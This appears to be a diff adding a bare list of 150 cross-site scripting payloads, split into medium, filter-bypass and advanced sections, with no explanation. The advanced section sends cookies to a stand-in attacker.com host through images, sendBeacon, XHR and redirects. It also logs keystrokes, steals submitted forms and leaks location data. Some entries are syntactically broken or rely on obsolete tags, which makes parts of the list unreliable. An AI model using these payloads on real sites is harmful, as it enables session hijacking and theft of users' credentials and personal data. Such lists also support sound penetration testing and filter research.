@@ -1,0 +1,167 @@
+-----------------------------------
+ Medium Level XSS Payloads (50)
+-----------------------------------
+
+1. <script>alert('XSS')</script>
+2. <img src=x onerror=alert(1)>
+3. <svg onload=alert(1)>
+4. <body onload=alert(1)>
+5. <iframe src="javascript:alert(1)">
+6. <a href="javascript:alert(1)">click</a>
+7. <form><button formaction=javascript:alert(1)>XSS</button>
+8. <input onfocus=alert(1) autofocus>
+9. <details ontoggle=alert(1) open>
+10. <video><source onerror=alert(1)>
+11. <audio src=x onerror=alert(1)>
+12. <select onfocus=alert(1)></select>
+13. <keygen autofocus onfocus=alert(1)>
+14. <textarea onfocus=alert(1) autofocus>
+15. <marquee onstart=alert(1)>
+16. <isindex type=image src=1 onerror=alert(1)>
+17. <div onmouseover=alert(1)>hover</div>
+18. <style>@import 'javascript:alert(1)'</style>
+19. <object data="javascript:alert(1)">
+20. <embed src="javascript:alert(1)">
+21. <base href="javascript:alert(1)//">
+22. <link rel=import href="javascript:alert(1)">
+23. <math href="javascript:alert(1)">click</math>
+24. <table background="javascript:alert(1)"></table>
+25. <!--<img src="--><img src=x onerror=alert(1)>">
+26. <?xml version="1.0"><xml><x xmlns="http://www.w3.org/1999/xhtml" id="x"></x><![CDATA[</xml><img src=x onerror=alert(1)//]]>
+27. <![><img src=x onerror=alert(1)]>
+28. <comment><img src="</comment><img src=x onerror=alert(1))//">
+29. <noscript><p>title</noscript><img src=x onerror=alert(1)>
+30. <input type=image src=valid.gif onerror=alert(1)>
+31. <form id=test onforminput=alert(1)><input></form>
+32. <button onfocus=alert(1) autofocus>test</button>
+33. <option onfocus=alert(1)></option>
+34. <track default onload=alert(1)>
+35. <xss id=x onfocus=alert(1) tabindex=1>test</xss>
+36. <image src=1 onerror=alert(1)>
+37. <isindex prompt="alert(1)" autofocus onfocus=alert(1)>
+38. <frameset onload=alert(1)>
+39. <applet code="javascript:alert(1)">
+40. <bgsound src="javascript:alert(1)">
+41. <input onblur=alert(1) autofocus><input autofocus>
+42. <body onscroll=alert(1)><br><br><br>...<br><br><br>
+43. <d3vg onscroll=alert(1)><br><br><br>...<br><br><br>
+44. <xss style="behavior:url(#default#time2)" onbegin="alert(1)">
+45. <set attributeName="innerHTML" to="<img src=x onerror=alert(1)>">
+46. <animate onbegin=alert(1) attributeName=x></animate>
+47. <![CDATA[<]]>script>alert(1)<![CDATA[</]]>script>
+48. <div style="background:url(javascript:alert(1))">
+49. <div style="width:expression(alert(1))">
+50. <style>li {list-style-image: url(javascript:alert(1));}</style>
+
+
+------------------------------------------------------------------
+
+ Filter Bypass Payloads (50)
+
+------------------------------------------------------------------
+
+1. <ScRiPt>alert(1)</ScRiPt>
+2. <img src=x oneonrror=alert(1)>
+3. <img src=x onerror&#61;alert(1)>
+4. <img src=x onerror=alert`1`>
+5. <img src=x onerror=alert(1)//
+6. <img src=x onerror=alert(String.fromCharCode(49))>
+7. <img src=x onerror=eval('al'+'ert(1)')>
+8. <img src=x onerror=window['alert'](1)>
+9. <img src=x onerror=top['al'+'ert'](1)>
+10. <img src=x onerror=parent['alert'](1)>
+11. <img src=x onerror=self['alert'](1)>
+12. <img src=x onerror=this['alert'](1)>
+13. <img src=x onerror=globalThis['alert'](1)>
+14. <img src=x onerror=(1&&alert)(1)>
+15. <img src=x onerror=alert.call(null,1)>
+16. <img src=x onerror=alert.apply(null,[1])>
+17. <img src=x onerror=Function('ale'+'rt(1)')()>
+18. <img src=x onerror=new Function`al\ert\`1\``>
+19. <img src=x onerror=setTimeout`al\ert\`1\``>
+20. <img src=x onerror=setInterval`al\ert\`1\``>
+21. <img src=x onerror=import('data:text/javascript,alert(1)')>
+22. <img src=x onerror=location='javascript:alert(1)'>
+23. <img src=x onerror=open('javascript:alert(1)')>
+24. <img src=x onerror=document.write('<script>alert(1)</script>')>
+25. <img src=x onerror=document.writeln('<script>alert(1)</script>')>
+26. <img src=x onerror=innerHTML='<img src=x onerror=alert(1)>'>
+27. <img src=x onerror=outerHTML='<img src=x onerror=alert(1)>'>
+28. <img src=x onerror=insertAdjacentHTML('beforeend','<img src=x onerror=alert(1)>')>
+29. <img src=x onerror=createContextualFragment('<img src=x onerror=alert(1)>')>
+30. <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+31. <img src=x onerror=eval('\141\154\145\162\164\50\61\51')>
+32. <img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>
+33. <img src=x onerror=eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>
+34. <img src=x onerror='al'%2B'ert(1)'>
+35. <img src=x onerror=alert&lpar;1&rpar;>
+36. <img src=x onerror=alert%281%29>
+37. <img src=x onerror=alert%20%281%29>
+38. <img src=x onerror=alert((1))>
+39. <img src=x onerror=alert(1.0)>
+40. <img src=x onerror=alert(0x1)>
+41. <img src=x onerror=alert(01)>
+42. <img src=x onerror=alert(true)>
+43. <img src=x onerror=alert(!false)>
+44. <img src=x onerror=alert(!0)>
+45. <img src=x onerror=alert(1..valueOf())>
+46. <img src=x onerror=alert(1 .constructor)>
+47. <img src=x onerror=alert(null.1)>
+48. <img src=x onerror=alert(undefined.1)>
+49. <img src=x onerror=alert(1in(1))>
+50. <img src=x onerror=alert(1==1)>
+
+-----------------------------------------------
+Advanced XSS Payloads (50)
+-----------------------------------------------
+
+1. <script>fetch('/steal?cookie='+document.cookie)</script>
+2. <img src=x onerror="var i=new Image();i.src='http://attacker.com/?c='+document.cookie">
+3. <script>navigator.sendBeacon('http://attacker.com', document.cookie)</script>
+4. <script>var x=new XMLHttpRequest();x.open('POST','http://attacker.com',true);x.send(document.cookie)</script>
+5. <script>location='http://attacker.com/?c='+btoa(document.cookie)</script>
+6. <script>window.addEventListener('keydown',e=>fetch('/log?key='+e.key))</script>
+7. <img src=x onerror="document.addEventListener('copy',e=>e.clipboardData.setData('text/plain','hacked'))">
+8. <script>Notification.requestPermission().then(p=>{if(p=='granted')new Notification('XSS')})</script>
+9. <script>navigator.clipboard.writeText('malicious content')</script>
+10. <script>localStorage.setItem('token','hacked')</script>
+11. <script>sessionStorage.setItem('session','compromised')</script>
+12. <script>document.domain='attacker.com'</script>
+13. <script>window.name='malicious data'</script>
+14. <script>history.replaceState(null,null,'/?xss='+document.cookie)</script>
+15. <script>caches.open('xss').then(c=>c.put('/test',new Response(document.cookie)))</script>
+16. <script>import('data:text/javascript,alert(1)')</script>
+17. <script>new Worker('data:text/javascript,alert(1)')</script>
+18. <script>SharedWorker('data:text/javascript,alert(1)')</script>
+19. <script>eval(import('data:text/javascript,alert(1)'))</script>
+20. <script>setInterval(()=>fetch('/screenshot'),1000)</script>
+21. <img src=x onerror="document.querySelector('form').addEventListener('submit',e=>{e.preventDefault();fetch('/steal',{method:'POST',body:new FormData(e.target)})})">
+22. <script>document.addEventListener('visibilitychange',()=>fetch('/visible='+!document.hidden))</script>
+23. <script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>{/* access camera */})</script>
+24. <script>navigator.geolocation.getCurrentPosition(p=>fetch('/location?lat='+p.coords.latitude+'&lon='+p.coords.longitude))</script>
+25. <script>fetch('/credentials',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('/exfil?data='+btoa(d)))</script>
+26. <script>Object.defineProperty(document,'cookie',{get:()=>'hacked'})</script>
+27. <script>Proxy=new Proxy(alert,{get:()=>()=>{}})</script>
+28. <script>Object.prototype.toString=()=>{alert(1)}</script>
+29. <script>Array.prototype.map=()=>{alert(1)}</script>
+30. <script>String.prototype.includes=()=>{alert(1)}</script>
+31. <script>Promise.prototype.then=()=>{alert(1)}</script>
+32. <script>fetch=()=>{alert(1);return Promise.resolve()}</script>
+33. <script>XMLHttpRequest.prototype.open=()=>{alert(1)}</script>
+34. <script>Element.prototype.setAttribute=()=>{alert(1)}</script>
+35. <script>document.addEventListener('DOMNodeInserted',()=>{alert(1)})</script>
+36. <script>MutationObserver=class{observe(){alert(1)}}</script>
+37. <script>window.addEventListener('message',e=>{if(e.origin!='http://trusted.com')return;eval(e.data)})</script>
+38. <script>opener.postMessage('malicious','*')</script>
+39. <script>parent.postMessage(document.cookie,'*')</script>
+40. <script>top.postMessage('xss','*')</script>
+41. <script>frames[0].postMessage('attack','*')</script>
+42. <script>open('javascript:alert(1)','_self')</script>
+43. <script>document.location='javascript:alert(1)'</script>
+44. <script>document.location.href='javascript:alert(1)'</script>
+45. <script>document.location.replace('javascript:alert(1)')</script>
+46. <script>document.location.assign('javascript:alert(1)')</script>
+47. <script>history.pushState(null,null,'javascript:alert(1)')</script>
+48. <script>history.replaceState(null,null,'javascript:alert(1)')</script>
+49. <script>documentElement.innerHTML='<img src=x onerror=alert(1)>'</script>
+50. <script>document.write('<script>alert(1)</script>')</script>
